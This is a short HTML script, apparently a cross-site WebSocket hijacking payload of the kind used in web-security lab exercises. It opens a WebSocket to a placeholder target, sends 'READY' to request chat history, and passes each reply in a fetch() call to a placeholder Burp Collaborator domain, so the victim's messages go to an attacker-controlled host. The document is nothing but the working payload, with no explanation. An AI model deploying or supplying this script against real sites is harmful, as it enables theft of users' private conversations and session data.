<script>
websocket = new WebSocket('wss://your_wss_url_here/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://burp_collaborator_domain_here/?'+event.data, {mode: 'no-cors'})
}
</script>
